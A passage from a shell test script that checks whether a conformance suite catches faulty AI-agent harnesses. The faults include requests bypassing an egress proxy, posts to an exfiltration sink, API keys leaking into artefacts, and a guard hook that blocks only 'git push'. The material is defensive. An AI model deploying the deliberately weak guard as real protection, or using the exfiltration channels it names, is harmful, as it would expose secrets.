        "GO: harness-conformance — fake-cli, against a scripted model, "*) [ "$rc" -eq 0 ] || verdict="exit $rc" ;;
        *) rc=1 ;;
      esac
      [ "$rc" -eq 0 ] || nogo "the good fake-cli was refused ($1)" "got: $verdict" "$(tail -n 40 "$errfile")"
      # Once at its start, so a proxy from an earlier run does not serve this one, and once on exit.
      [ "$(awk 'END{print NR}' "$t/.proof/egress.removed" 2>/dev/null)" = 2 ] \
        || nogo "the good fake-cli's run did not remove egress exactly at its start and on exit ($1)" ;;
    *)
      [ "$rc" -eq 1 ] || nogo "the suite accepted a harness that is wrong ($1): exit $rc" "$verdict"
      case "$verdict" in
        "NO-GO: harness-conformance — "*"$3"*) ;;
        *) nogo "the suite refused '$1' for another reason than expected" "wanted: $3" "got: $verdict" \
             "--- the suite's stderr, last 30 lines" "$(tail -n 30 "$errfile")" ;;
      esac ;;
  esac
}

proved=0
tweak=""
prove "good fake-cli" "" GO

# One defect each: a real harness's way of being wrong, and the case that must say so.
prove "answers another provider after starting a container" late-refusal "fake-cli case 0:"
prove "writes a second line before refusing" more-lines "fake-cli case 0:"
prove "runs a model it was not paired with" no-refusal "fake-cli case 0:"
prove "forgets the thinking value" no-thinking "fake-cli case 1:"
prove "forgets the role prompt" no-prompt "fake-cli case 1:"
prove "records the requested model, not the served one" raw-model "fake-cli case 1:"
prove "reports other tokens than the model spent" tokens-doubled "fake-cli case 1:"
prove "drops the endpoint from run.json" no-endpoint "fake-cli case 1:"
prove "hooks that log a denial and let the call through" log-only "fake-cli case 2:"
prove "no hook at all" no-hook "fake-cli case 1: OUT/hooks.log"
prove "ignores MAX_TURNS" no-turn-limit "fake-cli case 5:"
prove "stops on TOKEN_BUDGET with its own words" wrong-stop-phrase "fake-cli case 5:"
prove "never stops on TOKEN_BUDGET" no-token-limit "fake-cli case 6:"
prove "the key reaches a request body" key-in-body "fake-cli case 3:"

# Confinement (docs/adr/0046). Case 1 meets what any case would: a request that did not come
# from the proxy, one that reached the sink's name, one that went to /exfil.
prove "reaches the model around the proxy" direct-model "fake-cli case 1: the stub saw requests from"
prove "talks to the sink through a list that lets it through" sink-touch "fake-cli case 1: 1 request(s) reached conformance-sink or /exfil"
prove "posts to /exfil on the model's own host" exfil-path "fake-cli case 1: 1 request(s) reached conformance-sink or /exfil"
# Case 9: each way the probe tries, left open in turn, and a proxy that took one host too many.
prove "a list that lets the sink through (probe ways a, b)" allow-sink "fake-cli case 9: channel a is open"
prove "a list that lets the model's name through on another port (c)" allow-model-port "fake-cli case 9: channel c is open"
prove "a list that lets example.com through (d)" allow-example "fake-cli case 9: channel d is open"
prove "a container that reaches the sink's address directly (e)" open-sink-direct "fake-cli case 9: channel e is open"
prove "a container that reaches 1.1.1.1 directly (g)" open-public "fake-cli case 9: channel g is open"
prove "a container whose DNS resolves example.com (h)" open-dns "fake-cli case 9: channel h is open"
prove "a probe that cannot reach the proxy, so tried nothing" probe-cut-off "fake-cli case 9: the proxy's log holds no DENY"
prove "a proxy that takes a host of the harness's own" side-host "fake-cli case 9: the proxy took a host other than the scripted model"
prove "a tool result cut short, so the probe's last ways are not seen" cut-output "fake-cli case 9: the tool result has no 'egress-probe d' line"
prove "the key in an artefact of case 9 alone" key-in-probe-case "fake-cli case 8:"

# A guard that only knows git push: pushes are refused, secrets are readable.
# shellcheck disable=SC2329 # invoked by name through $tweak in prove
push_only_guard() {
  cat > "$1/adapters/fake-cli/hooks/guard.sh" <<'GUARD'
#!/bin/sh
input=$(cat)
if printf '%s' "$input" | grep -q 'git push'; then
  printf 'DENY x git push\n' >> "${CREW_OUT:-.}/hooks.log"
  echo "denied: matched git push" >&2
  exit 2
fi
printf 'ALLOW x -\n' >> "${CREW_OUT:-.}/hooks.log"
exit 0
GUARD
}
tweak=push_only_guard
prove "a guard that knows git push and nothing else" "" "fake-cli case 3:"

# A key that leaks into an artefact only when a run is stopped: only case 8 reads every case.
tweak=""
prove "the key in an artefact of a stopped run" key-on-stop "fake-cli case 8:"

# A compose project that starts something beside the worker.
compose_json='{"services":{"conformance-model":{"networks":{"default":{"aliases":["conformance-sink"]}}},"egress":{},"fake-cli":{"depends_on":{"postgres":{}}}}}'
prove "a worker whose service starts Postgres with it" "" "would also start postgres"

# A harness whose conformance.env has no EGRESS (ci/harness-shape.sh judges it for everyone, but
# the suite does not let a harness it runs skip it).
# shellcheck disable=SC2329 # invoked by name through $tweak in prove
no_egress_key() { grep -v '^EGRESS=' "$1/adapters/fake-cli/conformance.env" > "$1/c.new"; mv "$1/c.new" "$1/adapters/fake-cli/conformance.env"; }
tweak=no_egress_key
prove "a conformance.env without EGRESS" "" "has no EGRESS="
tweak=""

# A project without the proxy, or without the sink's name: case 9 would prove nothing.
compose_json='{"services":{"conformance-model":{"networks":{"default":{"aliases":["conformance-sink"]}}},"fake-cli":{}}}'
prove "a project with no egress service" "" "has no service egress"
compose_json='{"services":{"conformance-model":{},"egress":{},"fake-cli":{}}}'
prove "a scripted model with no sink alias" "" "no alias conformance-sink"
compose_json=""

go
